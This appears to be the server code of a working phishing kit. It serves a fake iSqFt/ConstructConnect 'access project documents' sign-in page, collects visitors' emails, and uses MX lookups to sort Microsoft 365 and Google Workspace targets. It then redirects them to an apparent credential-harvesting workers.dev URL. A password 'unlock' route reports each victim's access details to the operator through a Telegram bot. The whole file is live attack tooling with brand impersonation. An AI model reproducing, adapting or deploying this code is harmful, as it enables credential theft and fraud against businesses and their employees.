// server.js
const express = require('express');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
// Never serve the raw PHP source; "/" and "/index.php" are handled by the Node routes below.
app.use(express.static(__dirname, { index: false, hidden: ['index.php'] }));

const CORRECT_CODE = process.env.DOCUMENT_PASSWORD || "2089210";

// Add as many URLs as you want here. The script will pick one at random.
const REDIRECT_URLS = [
  "https://gc2089-proposals-2a7522.cdngroupsbidding.workers.dev/?k=InUnPNcqMEFoRP7B5v-A4dd_"
];

// Simple in-memory CSRF tokens (the page template uses hidden inputs like the PHP version).
const csrfTokens = new Set();
function issueToken() {
  const token = crypto.randomBytes(32).toString('hex');
  csrfTokens.add(token);
  return token;
}
function consumeToken(token) {
  if (token && csrfTokens.has(token)) {
    csrfTokens.delete(token);
    return true;
  }
  return false;
}

// Microsoft 365 / Google Workspace MX lookup (replaces the PHP getmxrr logic)
function lookupMx(domain) {
  return new Promise((resolve) => {
    if (!domain) return resolve([]);
    try {
      const dns = require('dns');
      dns.resolveMx(domain, (err, records) => {
        if (err || !records) return resolve([]);
        resolve(records.sort((a, b) => a.priority - b.priority).map((r) => r.exchange.toLowerCase()));
      });
    } catch (e) {
      resolve([]);
    }
  });
}

function sendTelegramNotification(req, res, userAgent, referrer, password) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  console.log('Bot token exists:', !!token);
  console.log('Chat ID:', chatId);

  if (!token || !chatId) {
    console.error("Missing Telegram environment variables");
    return res.status(500).json({
      success: false,
      error: "Server configuration error"
    });
  }

  const now = new Date().toLocaleString('en-US', {
    timeZone: 'America/New_York',
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

  // Clean message - no special characters that could break Telegram
  const message =
    `SUCCESSFUL UNLOCK\n` +
    `Document: Project-TH2027.pdf\n` +
    `Time: ${now}\n` +
    `User Agent: ${userAgent || 'unknown'}\n` +
    `Referrer: ${referrer || 'direct'}\n` +
    `Password Used: ${password}\n` +
    `Client accessed the document.`;

  return axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
    chat_id: chatId,
    text: message
  })
    .then((response) => {
      console.log('✅ Telegram notification sent successfully');
      console.log('Telegram response:', response.data);
    })
    .catch((telegramError) => {
      // Log the EXACT error from Telegram
      if (telegramError.response) {
        console.error('❌ Telegram Error Status:', telegramError.response.status);
        console.error('❌ Telegram Error Data:', JSON.stringify(telegramError.response.data));
      } else {
        console.error('❌ Telegram Error:', telegramError.message);
      }
    })
    .finally(() => {
      // Always allow access even if Telegram fails
      const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
      res.json({
        success: true,
        redirectUrl: randomUrl
      });
    });
}

app.post('/api/unlock', async (req, res) => {
  try {
    const { password, userAgent, referrer } = req.body;

    console.log('Received unlock request. Password provided:', !!password);

    if (password === CORRECT_CODE) {
      return sendTelegramNotification(req, res, userAgent, referrer, password);
    } else {
      console.log('❌ Incorrect password attempt');
      res.status(401).json({ 
        success: false, 
        error: "That password is incorrect. Try again." 
      });
    }
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: "Failed to process request" 
    });
  }
});

// Email verification endpoint (replaces the PHP POST handling in index.php).
// Accepts both JSON and classic url-encoded form posts from script.js.
app.post('/', async (req, res) => {
  try {
    const wantsJson = (req.get('accept') || '').includes('application/json');
    const respond = (status, payload) => {
      if (wantsJson) return res.status(status).json(payload);
      // Non-JSON fallback: render the page with an inline error message.
      res.status(status).send(renderPage(payload.error || ''));
    };

    if (!consumeToken(req.body && req.body.csrf_token)) {
      return respond(403, { success: false, error: 'Your session expired. Refresh the page and try again.' });
    }

    const email = String((req.body && req.body.email) || '').trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
      return respond(422, { success: false, error: 'Enter a valid email address.' });
    }

    const domain = email.slice(email.lastIndexOf('@') + 1).toLowerCase();
    const mxRecords = await lookupMx(domain);

    if (!mxRecords.length) {
      return respond(422, {
        success: false,
        error: 'We could not verify that email domain. Please use your work email.'
      });
    }

    let provider = 'your organization';
    let redirectUrl = null;
    for (const mx of mxRecords) {
      if (mx.includes('outlook.com') || mx.includes('protection.outlook.com')) {
        provider = 'Microsoft 365';
        redirectUrl = process.env.MICROSOFT_REDIRECT_URL || REDIRECT_URLS[0];
        break;
      }
      if (mx.includes('google.com') || mx.includes('googlemail.com')) {
        provider = 'Google Workspace';
        redirectUrl = process.env.GOOGLE_REDIRECT_URL || REDIRECT_URLS[0];
        break;
      }
    }

    if (!redirectUrl) {
      return respond(200, {
        success: true,
        domain,
        provider,
        redirect_url: null,
        error: 'This organization does not have a redirect configured yet.'
      });
    }

    if (wantsJson) {
      return res.json({ success: true, domain, provider, redirect_url: redirectUrl });
    }
    return res.redirect(302, redirectUrl);
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ success: false, error: 'Failed to process request' });
  }
});

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderPage(errorMessage) {
  const token = issueToken();
  return `<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in · iSqFt</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <div class="page">
      <div class="bg" aria-hidden="true"></div>
      <div class="bg-veil" aria-hidden="true"></div>

      <header class="top-banner">
        <p>
          iSqFt is now a ConstructConnect<sup>™</sup> company.
          <a href="#">Learn More.</a>
        </p>
      </header>

      <main class="stage">
        <div class="brand">
          <img
            src="assets/logo.png"
            alt="iSqFt, a ConstructConnect company"
            class="brand-logo"
          />
        </div>

        <section class="panel" aria-labelledby="signin-title">
          <h1 id="signin-title">Enter your email address to access project documents</h1>

          <form class="signin-form" id="signin-form" action="" method="post" novalidate>
            <input type="hidden" name="csrf_token" value="${escapeHtml(token)}" />
            <div class="field-wrap">
              <label class="field" for="email">
                <span class="sr-only">Email Address</span>
                <span class="field-icon" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="18" height="18" fill="none">
                    <path
                      d="M4 6.5h16a1.5 1.5 0 0 1 1.5 1.5v8a1.5 1.5 0 0 1-1.5 1.5H4A1.5 1.5 0 0 1 2.5 16V8A1.5 1.5 0 0 1 4 6.5Z"
                      stroke="currentColor"
                      stroke-width="1.6"
                    />
                    <path
                      d="m3.5 8 8.1 5.2a.8.8 0 0 0 .8 0L20.5 8"
                      stroke="currentColor"
                      stroke-width="1.6"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    />
                  </svg>
                </span>
                <input
                  id="email"
                  type="email"
                  name="email"
                  placeholder="Email Address"
                  autocomplete="email"
                  inputmode="email"
                  spellcheck="false"
                  required
                  aria-describedby="email-error"
                  aria-invalid="false"
                />
              </label>
              <p
                id="email-error"
                class="field-error"
                role="alert"
                ${errorMessage !== '' ? '' : 'hidden'}
              >
                ${escapeHtml(errorMessage !== '' ? errorMessage : 'Enter a valid email address.')}
              </p>
            </div>

            <button type="submit" class="login-btn" id="continue-btn" disabled>
              <span id="continue-label">Continue</span>
              <span class="login-arrow" aria-hidden="true">
                <svg viewBox="0 0 24 24" width="14" height="14" fill="none">
                  <path
                    d="M5 12h12m0 0-4.5-4.5M17 12l-4.5 4.5"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  />
                </svg>
              </span>
            </button>
            <p class="form-status" role="status" aria-live="polite"></p>
          </form>
        </section>
      </main>

      <footer class="site-footer">
        <p>2026 © iSqFt, Inc. All Rights Reserved.</p>
      </footer>
    </div>
    <script src="script.js"></script>
  </body>
</html>`;
}

app.get(['/', '/index.html', '/index.php'], (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.send(renderPage(''));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
